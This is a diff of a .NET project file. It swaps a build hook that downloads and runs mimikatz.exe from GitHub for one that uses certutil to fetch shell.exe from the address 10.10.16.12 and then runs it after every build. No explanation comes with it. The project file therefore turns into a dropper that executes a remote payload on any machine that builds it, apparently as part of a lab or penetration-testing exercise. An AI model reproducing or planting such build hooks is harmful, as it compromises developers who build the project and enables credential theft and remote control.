@@ -5,8 +5,8 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-	  <PreBuildEvent>certutil.exe -f -urlcache -split https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe C:\Users\0xm3m\Desktop\mimikatz.exe</PreBuildEvent>
-	  <PostBuildEvent>C:\Users\0xm3m\Desktop\mimikatz.exe</PostBuildEvent>
+	  <PreBuildEvent>certutil.exe -f -urlcache -split http://10.10.16.12/shell.exe C:\Users\Public\shell.exe</PreBuildEvent>
+	  <PostBuildEvent>C:\Users\Public\shell.exe</PostBuildEvent>
   </PropertyGroup>
 
 </Project>
